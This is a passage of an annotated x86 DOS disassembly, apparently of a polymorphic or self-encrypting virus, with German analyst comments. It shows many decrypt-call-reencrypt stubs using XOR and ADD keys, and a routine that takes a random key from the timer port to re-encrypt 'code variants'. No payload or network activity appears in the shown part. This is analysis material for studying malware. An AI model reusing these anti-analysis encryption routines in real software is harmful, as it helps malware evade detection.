L3EFC:  MOV AL,[BX]             ;3EFC 8A 07
    INC BX              ;3EFE 43
    MOV AH,[BX]             ;3EFF 8A 27
    XCHG    AH,AL               ;3F01 86 E0
    MOV [BX-1],AL           ;3F03 88 47 FF
    MOV [BX],AH             ;3F06 88 27
    INC BX              ;3F08 43
    XOR AX,AX               ;3F09 33 C0
    SUB CX,2                ;3F0B 83 E9 02
                        ;L3F0E    L3F3D CJ
L3F0E:  RET_NEAR                ;3F0E C3

    PUSH    CS              ;3F0F 0E
    POP DS              ;3F10 1F
    JMP SHORT   L3F28           ;3F11 EB 15

                        ;L3F13    L3EFA CJ  L3F16 CJ
L3F13:  CALL    L3EFC               ;3F13 E8 E6 FF
    JNZ L3F13               ;3F16 75 FB
    POP AX              ;3F18 58
    POP BX              ;3F19 5B
    STI                 ;3F1A FB
    POP CX              ;3F1B 59
    PUSH    L2566               ;3F1C FF 36 66 25
    POP L259A               ;3F20 8F 06 9A 25
    CALL    WORD PTR L259A          ;3F24 FF 16 9A 25
                        ;L3F28    L3F11 CJ
L3F28:  CALL    L3F2B               ;3F28 E8 00 00
                        ;L3F2B    L3F28 CC
L3F2B:  POP BX              ;3F2B 5B
    SUB BX,OFFSET L23B8         ;3F2C 81 EB B8 23
    MOV CX,OFFSET L2384         ;3F30 B9 84 23
                        ;L3F33    L3F36 CJ
L3F33:  CALL    L3EFC               ;3F33 E8 C6 FF
    JNZ L3F33               ;3F36 75 FB
    CMP BYTE PTR [BX+DS:8F],1       ;3F38 80 BF 8F 00 01
    JZ  L3F0E               ;3F3D 74 CF
                        ;L3F3F    L3DC1 CC
L3F3F:  PUSH    ES              ;3F3F 06
    POP DS              ;3F40 1F
    JMP L1B74               ;3F41 E9 30 DC

    PUSH    DX              ;3F44 52
    MOV DH,[BX-1]           ;3F45 8A 77 FF
    PUSH    AX              ;3F48 50
                        ;L3F49    L3F54 CJ
L3F49:  MOV DL,[BX]             ;3F49 8A 17
    DEC DH              ;3F4B FE CE
    XOR [BX],DH             ;3F4D 30 37
    XCHG    DH,DL               ;3F4F 86 F2
    ADD BX,1                ;3F51 83 C3 01
    LOOP    L3F49               ;3F54 E2 F3
    POP CX              ;3F56 59
    POP AX              ;3F57 58
    JMP L3F60               ;3F58 E9 05 00

                        ;L3F5B    L3F6B CJ
L3F5B:  CALL    L3F5E               ;3F5B E8 00 00
                        ;L3F5E    L3F5B CC
L3F5E:  JMP SHORT   L3F6D           ;3F5E EB 0D

                        ;L3F60    L3F58 CJ
L3F60:  MOV DX,AX               ;3F60 8B D0
    POP AX              ;3F62 58
    MOV BX,AX               ;3F63 8B D8
    POP AX              ;3F65 58
    XCHG    CX,AX               ;3F66 91
    CALL    WORD PTR L2566          ;3F67 FF 16 66 25
    JMP SHORT   L3F5B           ;3F6B EB EE

                        ;L3F6D    L3F5E CJ
L3F6D:  POP BX              ;3F6D 5B
    MOV CX,OFFSET L2385         ;3F6E B9 85 23
    PUSH    CS              ;3F71 0E
    SUB BX,OFFSET L239F         ;3F72 81 EB 9F 23
    POP DS              ;3F76 1F
                        ;L3F77    L3F7F CJ
L3F77:  MOV AL,[BX-1]           ;3F77 8A 47 FF
    DEC AL              ;3F7A FE C8
    XOR [BX],AL             ;3F7C 30 07
    INC BX              ;3F7E 43
    LOOP    L3F77               ;3F7F E2 F6
    CMP BYTE PTR [BX+DS:8E],1       ;3F81 80 BF 8E 00 01
    JNZ L3F89               ;3F86 75 01
    RET_NEAR                ;3F88 C3

                        ;L3F89    L3F86 CJ
L3F89:  PUSH    ES              ;3F89 06
    XOR AX,AX               ;3F8A 33 C0
                        ;L3F8B    L3DCE CC
L3F8B   EQU $-1
    POP DS              ;3F8C 1F
    JMP L1BC0               ;3F8D E9 30 DC

    DEC CL              ;3F90 FE C9
                        ;L3F92    L3F99 CJ
L3F92:  XOR BYTE PTR [BX],67    ;'g'    ;3F92 80 37 67
    INC BX              ;3F95 43
    DEC CX              ;3F96 49
    INC BX              ;3F97 43
    DEC CX              ;3F98 49
    JNZ L3F92               ;3F99 75 F7
    PUSH    L2566               ;3F9B FF 36 66 25
    POP L2599               ;3F9F 8F 06 99 25
    POP BX              ;3FA3 5B
    POP CX              ;3FA4 59
    JMP SHORT   L3FAA           ;3FA5 EB 03

                        ;L3FA7    L3FAE CJ
L3FA7:  CALL    L3FD9               ;3FA7 E8 2F 00
                        ;L3FAA    L3FA5 CJ
L3FAA:  CALL    WORD PTR L2599          ;3FAA FF 16 99 25
    JMP SHORT   L3FA7           ;3FAE EB F7

                        ;L3FB0    L3FDA CJ
L3FB0:  MOV AX,2                ;3FB0 B8 02 00
    ADD BX,OFFSET LDD61         ;3FB3 81 C3 61 DD
    DEC BH              ;3FB7 FE CF
    MOV CX,OFFSET L2184         ;3FB9 B9 84 21
    PUSH    CS              ;3FBC 0E
    XOR CH,AL               ;3FBD 32 E8
    POP DS              ;3FBF 1F
                        ;L3FC0    L3FC7 CJ
L3FC0:  XOR BYTE PTR [BX],67    ;'g'    ;3FC0 80 37 67
    DEC CX              ;3FC3 49
    ADD BX,AX               ;3FC4 01 C3
    DEC CX              ;3FC6 49
    JNZ L3FC0               ;3FC7 75 F7
    ADD BX,8F               ;3FC9 81 C3 8F 00
    PATCH83
    DEC BYTE PTR [BX]           ;3FCD FE 0F
    PUSH    ES              ;3FCF 06
    POP DS              ;3FD0 1F
    JNZ L3FD4               ;3FD1 75 01
    RET_NEAR                ;3FD3 C3

                        ;L3FD4    L3FD1 CJ
L3FD4:  MOV AX,CX               ;3FD4 89 C8
                        ;L3FD6    L3587 CJ
L3FD6:  JMP L1C0C               ;3FD6 E9 33 DC

                        ;L3FD7    L3E1A CC
L3FD7   EQU $-2
                        ;L3FD9    L3FA7 CC
L3FD9:  POP BX              ;3FD9 5B
    JMP SHORT   L3FB0           ;3FDA EB D4

    DEC CX              ;3FDC 49
                        ;L3FDD    L3FE6 CJ
L3FDD:  XOR BYTE PTR [BX],0E8       ;3FDD 80 37 E8
    ADD BX,2                ;3FE0 83 C3 02
    SUB CX,2                ;3FE3 83 E9 02
    JNZ L3FDD               ;3FE6 75 F5
    POP BX              ;3FE8 5B
    PUSH    L2566               ;3FE9 FF 36 66 25
    POP L2598               ;3FED 8F 06 98 25
    JMP SHORT   L3FF6           ;3FF1 EB 03

                        ;L3FF3    L3FFB CJ
L3FF3:  CALL    L4024               ;3FF3 E8 2E 00
                        ;L3FF6    L3FF1 CJ
L3FF6:  POP CX              ;3FF6 59
    CALL    WORD PTR L2598          ;3FF7 FF 16 98 25
    JMP SHORT   L3FF3           ;3FFB EB F6

                        ;L3FFD    L4025 CJ
L3FFD:  MOV AX,2                ;3FFD B8 02 00
                        ;L4000    L3E6D DI  L43D5 DI
L4000:  ADD BX,OFFSET LDC61         ;4000 81 C3 61 DC
    MOV CX,OFFSET L2386         ;4004 B9 86 23
    PUSH    CS              ;4007 0E
    XOR CX,AX               ;4008 33 C8
    POP DS              ;400A 1F
                        ;L400B    L4012 CJ
L400B:  XOR BYTE PTR [BX],0E8       ;400B 80 37 E8
    ADD BX,AX               ;400E 01 C3
    SUB CX,AX               ;4010 2B C8
    JNZ L400B               ;4012 75 F7
    ADD BX,8F               ;4014 81 C3 8F 00
    PATCH83
                        ;L4016    L45B7 DI
L4016   EQU $-2
    DEC BYTE PTR [BX]           ;4018 FE 0F
    PUSH    ES              ;401A 06
    POP DS              ;401B 1F
    JNZ L401F               ;401C 75 01
    RET_NEAR                ;401E C3

                        ;L401F    L401C CJ
L401F:  MOV AX,CX               ;401F 89 C8
    JMP L1C58               ;4021 E9 34 DC

                        ;L4024    L3FF3 CC
L4024:  POP BX              ;4024 5B
    JMP SHORT   L3FFD           ;4025 EB D6

    XOR DX,[BP+SI-76]           ;4027 33 52 8A
    JA  L402B               ;402A 77 FF
                        ;L402B    L402A CJ
L402B   EQU $-1
                        ;L402C    L4035 CJ
L402C:  MOV DL,[BX]             ;402C 8A 17
    XOR [BX],DH             ;402E 30 37
    XCHG    DH,DL               ;4030 86 F2
    ADD BX,1                ;4032 83 C3 01
    LOOP    L402C               ;4035 E2 F5
    POP DX              ;4037 5A
    STI                 ;4038 FB
    POP BX              ;4039 5B
    POP CX              ;403A 59
    CALL    WORD PTR L2566          ;403B FF 16 66 25
    CALL    L4045               ;403F E8 03 00
    INC AX              ;4042 40
    XOR BX,SI               ;4043 33 DE
                        ;L4045    L403F CC
L4045:  OR  SI,SI               ;4045 0B F6
    INC BH              ;4047 FE C7
    POP BX              ;4049 5B
    SUB BX,OFFSET L23A1         ;404A 81 EB A1 23
    ADD BX,2                ;404E 83 C3 02
    MOV CX,OFFSET L2485         ;4051 B9 85 24
                        ;L4052    L4833 DI
L4052   EQU $-2
    DEC CH              ;4054 FE CD
    PUSH    CS              ;4056 0E
    POP DS              ;4057 1F
                        ;L4058    L405E CJ
L4058:  MOV AL,[BX-1]           ;4058 8A 47 FF
    XOR [BX],AL             ;405B 30 07
    INC BX              ;405D 43
    LOOP    L4058               ;405E E2 F8
    ADD BX,8E               ;4060 81 C3 8E 00
    PATCH83
    XCHG    BX,SI               ;4064 87 DE
    DEC BYTE PTR [SI]           ;4066 FE 0C
    JNZ L406D               ;4068 75 03
    XCHG    SI,BX               ;406A 87 F3
    RET_NEAR                ;406C C3

                        ;L406D    L4068 CJ
L406D:  PUSH    ES              ;406D 06
    XOR AX,AX               ;406E 33 C0
    POP DS              ;4070 1F
    JMP L1CA4               ;4071 E9 30 DC

    PUSH    DX              ;4074 52
    MOV DH,[BX-1]           ;4075 8A 77 FF
                        ;L4078    L407F CJ
L4078:  MOV DL,[BX]             ;4078 8A 17
    ADD [BX],DH             ;407A 00 37
    XCHG    DL,DH               ;407C 86 D6
    INC BX              ;407E 43
    LOOP    L4078               ;407F E2 F7
    POP DX              ;4081 5A
    POP BX              ;4082 5B
    POP CX              ;4083 59
    PUSH    SI              ;4084 56
    MOV SI,OFFSET L2567 ;'%g'       ;4085 BE 67 25
    DEC SI              ;4088 4E
    CALL    WORD PTR [SI]           ;4089 FF 14
    CALL    L4090               ;408B E8 02 00
    XOR BX,SI               ;408E 33 DE
                        ;L4090    L408B CC
L4090:  XOR SI,OFFSET L1876         ;4090 81 F6 76 18
    POP BX              ;4094 5B
    POP SI              ;4095 5E
                        ;L4096    L3AD3 DI  L3AF9 DI
L4096:  SUB BX,OFFSET L239F         ;4096 81 EB 9F 23
    MOV CX,OFFSET L2385         ;409A B9 85 23
    PUSH    CS              ;409D 0E
    POP DS              ;409E 1F
                        ;L409F    L40A5 CJ
L409F:  MOV AL,[BX-1]           ;409F 8A 47 FF
    SUB [BX],AL             ;40A2 28 07
    INC BX              ;40A4 43
    LOOP    L409F               ;40A5 E2 F8
    ADD BX,8E               ;40A7 81 C3 8E 00
    PATCH83
    XCHG    SI,BX               ;40AB 87 F3
    DEC BYTE PTR [SI]           ;40AD FE 0C
    JNZ L40B4               ;40AF 75 03
    XCHG    BX,SI               ;40B1 87 DE
    RET_NEAR                ;40B3 C3

                        ;L40B4    L40AF CJ
L40B4:  PUSH    ES              ;40B4 06
    XOR AX,AX               ;40B5 33 C0
                        ;L40B6    L4100 CJ
L40B6   EQU $-1
    POP DS              ;40B7 1F
    JMP L1CF0               ;40B8 E9 35 DC

    MOV CX,SI               ;40BB 8B CE
    ADD AX,OFFSET L3456 ;'4V'       ;40BD 05 56 34
    PUSH    AX              ;40C0 50
                        ;L40C1    L40C7 CJ
L40C1:  XOR BYTE PTR [BX],5         ;40C1 80 37 05
    INC BYTE PTR [BX]           ;40C4 FE 07
    INC BX              ;40C6 43
    LOOP    L40C1               ;40C7 E2 F8
    POP AX              ;40C9 58
    INC BX              ;40CA 43
    INC CX              ;40CB 41
    STD                 ;40CC FD
    STC                 ;40CD F9
    PUSH    AX              ;40CE 50
    XLAT                    ;40CF D7
    POP AX              ;40D0 58
    POP BX              ;40D1 5B
    POP CX              ;40D2 59
    CALL    WORD PTR L2566          ;40D3 FF 16 66 25
    CALL    L40DD               ;40D7 E8 03 00
    MOV BX,OFFSET L5601         ;40DA BB 01 56
                        ;L40DD    L40D7 CC
L40DD:  POP BX              ;40DD 5B
    SUB BX,OFFSET L239F         ;40DE 81 EB 9F 23
    MOV CX,OFFSET L8934         ;40E2 B9 34 89
    MOV CX,OFFSET L2385         ;40E5 B9 85 23
    PUSH    CS              ;40E8 0E
    PUSH    AX              ;40E9 50
    MOV AX,0                ;40EA B8 00 00
    MOV DS,AX               ;40ED 8E D8
    POP AX              ;40EF 58
    POP DS              ;40F0 1F
                        ;L40F1    L40F7 CJ
L40F1:  DEC BYTE PTR [BX]           ;40F1 FE 0F
    XOR BYTE PTR [BX],5         ;40F3 80 37 05
    INC BX              ;40F6 43
    LOOP    L40F1               ;40F7 E2 F8
    MOV CX,23   ;'#'            ;40F9 B9 23 00
    DEC BYTE PTR [BX+DS:8E]     ;40FC FE 8F 8E 00
    JZ  L40B6               ;4100 74 B4
    PUSH    ES              ;4102 06
    MOV CX,0                ;4103 B9 00 00
    POP DS              ;4106 1F
    JMP L1D3C               ;4107 E9 32 DC

    RET_NEAR                ;410A C3

    STI                 ;410B FB
    PUSH    AX              ;410C 50
    XLAT                    ;410D D7
                        ;L410E    L4114 CJ
L410E:  XOR BYTE PTR [BX],10        ;410E 80 37 10
    ADD BX,1                ;4111 83 C3 01
    LOOP    L410E               ;4114 E2 F8
    POP AX              ;4116 58
    POP BX              ;4117 5B
    POP CX              ;4118 59
    PUSH    SI              ;4119 56
    MOV SI,OFFSET L2566 ;'%f'       ;411A BE 66 25
    CLC                 ;411D F8
    CALL    WORD PTR [SI]           ;411E FF 14
    CLC                 ;4120 F8
    POP SI              ;4121 5E
    INC BX              ;4122 43
    CALL    L414F               ;4123 E8 29 00
    SUB BX,OFFSET L239F         ;4126 81 EB 9F 23
    MOV CX,OFFSET L2387         ;412A B9 87 23
    DEC CX              ;412D 49
    STC                 ;412E F9
    DEC CX              ;412F 49
                        ;L4130    L4136 CJ
L4130:  XOR BYTE PTR [BX],10        ;4130 80 37 10
    ADD BX,1                ;4133 83 C3 01
    LOOP    L4130               ;4136 E2 F8
    MOV CX,BX               ;4138 8B CB
    MOV CX,8E               ;413A B9 8E 00
    ADD BX,CX               ;413D 01 CB
    DEC BYTE PTR [BX]           ;413F FE 0F
    JZ  L4145               ;4141 74 02
    JMP SHORT   L4146           ;4143 EB 01

                        ;L4145    L4141 CJ
L4145:  RET_NEAR                ;4145 C3

                        ;L4146    L4143 CJ
L4146:  PUSH    ES              ;4146 06
    MOV AX,0                ;4147 B8 00 00
    POP DS              ;414A 1F
    CLC                 ;414B F8
    JMP L1D88               ;414C E9 39 DC

                        ;L414F    L4123 CC
L414F:  POP BX              ;414F 5B
    PUSH    BX              ;4150 53
    PUSH    CS              ;4151 0E
    PUSH    CX              ;4152 51
    STC                 ;4153 F9
    POP CX              ;4154 59
    POP DS              ;4155 1F
    CLC                 ;4156 F8
    RET_NEAR                ;4157 C3

                        ;L4158    L415E CJ
L4158:  ADD BYTE PTR [BX],5         ;4158 80 07 05
    ADD BX,1                ;415B 83 C3 01
    LOOP    L4158               ;415E E2 F8
    POP BX              ;4160 5B
    INC CX              ;4161 41
    POP CX              ;4162 59
    PUSH    SI              ;4163 56
    MOV SI,OFFSET L2566 ;'%f'       ;4164 BE 66 25
    CALL    WORD PTR [SI]           ;4167 FF 14
    CLC                 ;4169 F8
    POP SI              ;416A 5E
    INC DX              ;416B 42
    PUSH    AX              ;416C 50
    POP DX              ;416D 5A
    NOP                 ;416E 90
    CALL    L4173               ;416F E8 01 00
    CLC                 ;4172 F8
                        ;L4173    L416F CC
L4173:  POP BX              ;4173 5B
    SUB BX,OFFSET L239F         ;4174 81 EB 9F 23
    MOV CH,23   ;'#'            ;4178 B5 23
    MOV CL,85               ;417A B1 85
    CALL    L4198               ;417C E8 19 00
                        ;L417F    L4187 CJ
L417F:  SUB BYTE PTR [BX],5         ;417F 80 2F 05
    INC BX              ;4182 43
    CLC                 ;4183 F8
    ADD DX,12               ;4184 83 C2 12
    LOOP    L417F               ;4187 E2 F6
    ADD BX,8E               ;4189 81 C3 8E 00
    PATCH83
    DEC BYTE PTR [BX]           ;418D FE 0F
    JNZ L419C               ;418F 75 0B
    RET_NEAR                ;4191 C3

    INC BX              ;4192 43
    ADD CX,OFFSET L0D7A         ;4193 81 C1 7A 0D
    XLAT                    ;4197 D7
                        ;L4198    L417C CC
L4198:  PUSH    CS              ;4198 0E
    POP DS              ;4199 1F
                        ;L419A    L41D1 CJ
L419A:  RET_NEAR                ;419A C3

    MOVSB                   ;419B A4
                        ;L419C    L418F CJ
L419C:  PUSH    ES              ;419C 06
    POP DS              ;419D 1F
    JMP L1DD4               ;419E E9 33 DC

    POP AX              ;41A1 58
    POP BX              ;41A2 5B
    CLC                 ;41A3 F8
    JMP SHORT   L41B0           ;41A4 EB 0A

    DB  62  ??          ;41A6 62
    PUSH    DX              ;41A7 52
    PUSH    DI              ;41A8 57
    OR  CH,[DI]             ;41A9 0A 2D
    DEC BP              ;41AB 4D
    JLE L41E8               ;41AC 7E 3A
    OR  [BP+SI],AX          ;41AE 09 02
                        ;L41B0    L41A4 CJ  L41B3 CJ
L41B0:  INC BYTE PTR [BX]           ;41B0 FE 07
    INC BX              ;41B2 43
    LOOP    L41B0               ;41B3 E2 FB
    POP BX              ;41B5 5B
    POP CX              ;41B6 59
    CALL    WORD PTR L2566          ;41B7 FF 16 66 25
    CALL    L41BE               ;41BB E8 00 00
                        ;L41BE    L41BB CC
L41BE:  PUSH    CS              ;41BE 0E
    POP DS              ;41BF 1F
    POP BX              ;41C0 5B
    SUB BX,OFFSET L239F         ;41C1 81 EB 9F 23
    MOV CX,OFFSET L2385         ;41C5 B9 85 23
                        ;L41C8    L41CB CJ
L41C8:  DEC BYTE PTR [BX]           ;41C8 FE 0F
    INC BX              ;41CA 43
    LOOP    L41C8               ;41CB E2 FB
    DEC BYTE PTR [BX+DS:8E]     ;41CD FE 8F 8E 00
    JZ  L419A               ;41D1 74 C7
    PUSH    ES              ;41D3 06
    POP DS              ;41D4 1F
    JMP L1E20               ;41D5 E9 48 DC

    SUB AX,OFFSET L0D44         ;41D8 2D 44 0D
    SUB [BX+DI+38],BL           ;41DB 28 59 38
    ADC AL,57   ;'W'            ;41DE 14 57
    SUB [BX+DI],CX          ;41E0 29 09
    PUSH    CX              ;41E2 51
    SUB AL,57   ;'W'            ;41E3 2C 57
    POP DX              ;41E5 5A
                        ;L41E6    L4228 CJ
L41E6:  DEC AX              ;41E6 48
    INC AX              ;41E7 40
                        ;L41E8    L41AC CJ
L41E8:  OR  BX,[BX+SI]          ;41E8 0B 18
    SBB [BX+SI],AH          ;41EA 18 20
    OR  AL,0A               ;41EC 0C 0A
    SBB AL,1BH              ;41EE 1C 1B
    CMP AH,53   ;'S'            ;41F0 80 FC 53
    CLC                 ;41F3 F8
                        ;L41F4    L41FB CJ
L41F4:  PUSHF                   ;41F4 9C
    ADD BYTE PTR [BX],77    ;'w'    ;41F5 80 07 77
    POPF                    ;41F8 9D
    INC BX              ;41F9 43
    CMC                 ;41FA F5
    LOOP    L41F4               ;41FB E2 F7
    NOP                 ;41FD 90
    POP BX              ;41FE 5B
    CLC                 ;41FF F8
                        ;L4200    L37A3 DI  L37BF DI  L3806 DI  L3825 DI  L4500 DI  L4742 DI  L476E DI
L4200:  POP CX              ;4200 59
                        ;L4201    L44D8 DI
L4201:  PUSHF                   ;4201 9C
                        ;L4202    L37D5 DI  L44EB DI
L4202:  CALL    WORD PTR L2566          ;4202 FF 16 66 25
    POPF                    ;4206 9D
    CALL    L420A               ;4207 E8 00 00
                        ;L420A    L4207 CC
L420A:  STI                 ;420A FB
    PUSH    CS              ;420B 0E
    CLD                 ;420C FC
    POP DS              ;420D 1F
    XCHG    CX,AX               ;420E 91
    POP BX              ;420F 5B
    XCHG    CX,AX               ;4210 91
    SUB BX,OFFSET L239F         ;4211 81 EB 9F 23
                        ;L4212    L3A2E DI
L4212   EQU $-3
    STI                 ;4215 FB
    MOV CX,OFFSET L2385         ;4216 B9 85 23
                        ;L4219    L4220 CJ
L4219:  PUSH    DX              ;4219 52
    SUB BYTE PTR [BX],77    ;'w'    ;421A 80 2F 77
    POP DX              ;421D 5A
    INC BX              ;421E 43
    CMC                 ;421F F5
    LOOP    L4219               ;4220 E2 F7
    PUSH    AX              ;4222 50
    DEC BYTE PTR [BX+DS:8E]     ;4223 FE 8F 8E 00
    POP AX              ;4227 58
    JZ  L41E6               ;4228 74 BC
                        ;L4229    L30B3 DI
L4229   EQU $-1
    STI                 ;422A FB
    PUSH    ES              ;422B 06
    NOP                 ;422C 90
    POP DS              ;422D 1F
    NOP                 ;422E 90
    JMP L1E6C               ;422F E9 3A DC

                        ;L4232    L4275 CJ
L4232:  DB  62  ??          ;4232 62
    POP BP              ;4233 5D
    SBB AX,OFFSET L0B3F         ;4234 1D 3F 0B
    PUSH    SI              ;4237 56
    DB  63  ??          ;4238 63
    POP BX              ;4239 5B
    POP SP              ;423A 5C
    DB  36,0F8  ??  SS: ??  ;423B 36 F8
    OR  AL,0                ;423D 0C 00
    CMC                 ;423F F5
                        ;L4240    L4247 CJ
L4240:  PUSHF                   ;4240 9C
    XOR BYTE PTR [BX],41    ;'A'    ;4241 80 37 41
    NOP                 ;4244 90
    INC BX              ;4245 43
    POPF                    ;4246 9D
    LOOP    L4240               ;4247 E2 F7
    INC AX              ;4249 40
    POP BX              ;424A 5B
    CLD                 ;424B FC
    POP CX              ;424C 59
    DEC AX              ;424D 48
    CALL    WORD PTR L2566          ;424E FF 16 66 25
    INC AX              ;4252 40
    CALL    L4256               ;4253 E8 00 00
                        ;L4256    L4253 CC
L4256:  DB  2E,0F8  ??  CS: ??  ;4256 2E F8
    PUSH    CS              ;4258 0E
    POP DS  ES: ??      ;4259 26 1F
    POP BX  SS: ??      ;425B 36 5B
    STI                 ;425D FB
    SUB BX,OFFSET L239F         ;425E 81 EB 9F 23
    CLD                 ;4262 FC
    MOV CX,OFFSET L2385         ;4263 B9 85 23
                        ;L4266    L426D CJ
L4266:  PUSH    DX              ;4266 52
    XOR BYTE PTR [BX],41    ;'A'    ;4267 80 37 41
    POP DX              ;426A 5A
    INC BX              ;426B 43
    NOP                 ;426C 90
    LOOP    L4266               ;426D E2 F7
    PUSH    AX              ;426F 50
    DEC BYTE PTR [BX+DS:8E]     ;4270 FE 8F 8E 00
    POP AX              ;4274 58
    JZ  L4232               ;4275 74 BB
    PUSH    ES  CS: ??      ;4277 2E 06
    POP DS  DS: ??      ;4279 3E 1F
    STI                 ;427B FB
    JMP L1EB8               ;427C E9 39 DC

                        ;L427E    L42C4 CJ
L427E   EQU $-1
    PUSH    BX              ;427F 53
    POP BP              ;4280 5D
    CMP [BP+SI],DX          ;4281 39 12
    SBB AL,0BH              ;4283 1C 0B
    INC AX              ;4285 40
    DB  62  ??          ;4286 62
    XOR SP,LC9FE            ;4287 33 26 FE C9
    CMC                 ;428B F5
                        ;L428C    L4292 CJ
L428C:  PUSH    SS              ;428C 16
    ADD [BX],CL             ;428D 00 0F
    POP SS              ;428F 17
    INC BX              ;4290 43
    STD                 ;4291 FD
    LOOP    L428C               ;4292 E2 F8
    INC AL              ;4294 FE C0
    POP BX              ;4296 5B
    DEC AL              ;4297 FE C8
    STI                 ;4299 FB
    POP CX              ;429A 59
    CALL    WORD PTR L2566          ;429B FF 16 66 25
    INC BX              ;429F 43
    CALL    L42A3               ;42A0 E8 00 00
                        ;L42A3    L42A0 CC
L42A3:  XCHG    DX,AX               ;42A3 92
    PUSH    CS              ;42A4 0E
    XCHG    DX,AX               ;42A5 92
    POP DS              ;42A6 1F
    POP BX  SS: ??      ;42A7 36 5B
    PUSH    DI              ;42A9 57
    PUSH    AX              ;42AA 50
    SUB BX,OFFSET L23A0         ;42AB 81 EB A0 23
    POP AX              ;42AF 58
    POP DI              ;42B0 5F
    MOV CX,OFFSET L2384         ;42B1 B9 84 23
                        ;L42B4    L42BC CJ
L42B4:  PUSH    AX              ;42B4 50
    SUB [BX],CL             ;42B5 28 0F
    PUSH    CX              ;42B7 51
    POP AX              ;42B8 58
    INC BX              ;42B9 43
    POP CX              ;42BA 59
    XCHG    CX,AX               ;42BB 91
    LOOP    L42B4               ;42BC E2 F6
    INC BX              ;42BE 43
    DEC BYTE PTR [BX+DS:8E]     ;42BF FE 8F 8E 00
    NOP                 ;42C3 90
    JZ  L427E               ;42C4 74 B8
    PUSH    ES  ES: ??      ;42C6 26 06
    POP DS  DS: ??      ;42C8 3E 1F
                        ;L42CA    L4311 CJ
L42CA:  NOP                 ;42CA 90
    JMP L1F04               ;42CB E9 36 DC

    INT 3               ;42CE CC
    SBB WORD PTR [BX+SI+5BH],4C ;'L'    ;42CF 83 58 5B 4C
    XOR SP,LC1FE            ;42D3 33 26 FE C1
    CLD                 ;42D7 FC
                        ;L42D8    L42DE CJ
L42D8:  XCHG    SP,AX               ;42D8 94
    XOR [BX],CL             ;42D9 30 0F
    STI                 ;42DB FB
    INC BX              ;42DC 43
    XCHG    SP,AX               ;42DD 94
    LOOP    L42D8               ;42DE E2 F8
    POP BX  SS: ??      ;42E0 36 5B
    MOV AL,0                ;42E2 B0 00
    POP CX              ;42E4 59
    STI                 ;42E5 FB
    CALL    WORD PTR L2566          ;42E6 FF 16 66 25
    NOP                 ;42EA 90
    CALL    L42EE               ;42EB E8 00 00
                        ;L42EE    L42EB CC
L42EE:  PUSHF                   ;42EE 9C
    POPF                    ;42EF 9D
    PUSH    CS              ;42F0 0E
    PUSH    AX              ;42F1 50
    POP AX              ;42F2 58
    POP DS              ;42F3 1F
    POP BX  ES: ??      ;42F4 26 5B
    AND AL,5                ;42F6 24 05
    SUB BX,OFFSET L239F         ;42F8 81 EB 9F 23
    AND AL,8                ;42FC 24 08
    MOV CX,OFFSET L2386         ;42FE B9 86 23
                        ;L4300    L43DA DI
L4300   EQU $-1
                        ;L4301    L3777 DI  L4309 SJ  L43F8 DI
L4301:  PUSH    CX              ;4301 51
    XOR [BX],CL             ;4302 30 0F
    POP CX              ;4304 59
    INC BX  SS: ??      ;4305 36 43
    CLC                 ;4307 F8
    STI                 ;4308 FB
    LOOP    L4301               ;4309 E2 F6
    DEC BX              ;430B 4B
    DEC BYTE PTR [BX+DS:8E]     ;430C FE 8F 8E 00
    NOP                 ;4310 90
    JZ  L42CA               ;4311 74 B7
    PUSH    ES  DS: ??      ;4313 3E 06
    CMC                 ;4315 F5
    POP DS              ;4316 1F
    NOP                 ;4317 90
    JMP L1F50               ;4318 E9 35 DC

    PUSH    CX              ;431B 51
    POP BP              ;431C 5D
    CMP AX,OFFSET L1D43         ;431D 3D 43 1D
    ADD CX,SS:3             ;4320 36 83 C1 03
    PUSHF                   ;4324 9C
                        ;L4325    L432B CJ
L4325:  XCHG    BP,AX               ;4325 95
    ADD BYTE PTR [BX],3         ;4326 80 07 03
    XCHG    BP,AX               ;4329 95
    INC BX              ;432A 43
    LOOP    L4325               ;432B E2 F8
    POPF                    ;432D 9D
    POP BX              ;432E 5B
    PUSH    BP              ;432F 55
    POP BP              ;4330 5D
    POP CX              ;4331 59
    CALL    WORD PTR L2566          ;4332 FF 16 66 25
    CLD                 ;4336 FC
    CALL    L433A               ;4337 E8 00 00
                        ;L433A    L4337 CC
L433A:  XCHG    BP,AX               ;433A 95
    XCHG    BX,AX               ;433B 93
    PUSH    CS              ;433C 0E
    XCHG    BX,AX               ;433D 93
    XCHG    BP,AX               ;433E 95
    POP DS              ;433F 1F
    CLD                 ;4340 FC
    POP BX              ;4341 5B
    PUSH    SS              ;4342 16
    POP SS              ;4343 17
    SUB BX,OFFSET L239F         ;4344 81 EB 9F 23
    CLD                 ;4348 FC
    MOV CX,SS:OFFSET L2388      ;4349 36 B9 88 23
                        ;L434D    L4354 CJ
L434D:  PUSHF                   ;434D 9C
    SUB BYTE PTR [BX],3         ;434E 80 2F 03
    CLC                 ;4351 F8
    POPF                    ;4352 9D
    INC BX              ;4353 43
    LOOP    L434D               ;4354 E2 F7
    SUB BX,3                ;4356 83 EB 03
    ADD BYTE PTR [BX+DS:8E],0FF     ;4359 80 87 8E 00 FF
    CMP BYTE PTR [BX+DS:8E],1       ;435E 80 BF 8E 00 01
    JNB L4366               ;4363 73 01
    RET_NEAR                ;4365 C3

                        ;L4366    L4363 CJ
L4366:  PUSH    ES              ;4366 06
    POP DS              ;4367 1F
    JMP L1F9C               ;4368 E9 31 DC

    DB  12              ;436B 12
                        ;L436C    L3A79 CC
;   codiere Code-Varianten 3a84-436b 
L436C:  CALL    L3243           ;decode_code    ;436C E8 D4 EE
    DW  L7020               ;436F 20 70
    MOV BX,OFFSET L1274         ;4371 BB 74 12
    MOV CX,OFFSET L08E8         ;4374 B9 E8 08
                        ;L4377    L437B CJ
L4377:  IN  AL,40               ;4377 E4 40
    OR  AL,0                ;4379 0C 00
    JZ  L4377               ;437B 74 FA
                        ;L437D    L4381 CJ
L437D:  XOR CS:[BX],AL          ;437D 2E 30 07
    INC BX              ;4380 43
    LOOP    L437D               ;4381 E2 FA
    CALL    L4386               ;4383 E8 00 00
                        ;L4386    L4383 CC
L4386:  POP BX              ;4386 5B
    ADD BX,1E               ;4387 83 C3 1E
    MOV CS:[BX],AL          ;438A 2E 88 07
    CALL    L4989           ;jmp w ptr [24ea] -> jmp nach 093e+2810 -> 314e 
                        ;438D E8 F9 05
    DB  21              ;4390 21
    RET_NEAR                ;4391 C3

                        ;L4392    L3A57 CC
;   decodiere Code-Varianten 3a84-436b
L4392:  CALL    L3243           ;decode_code    ;4392 E8 AE EE
    DW  LFC0A               ;4395 0A FC
    MOV BX,OFFSET L1274         ;4397 BB 74 12
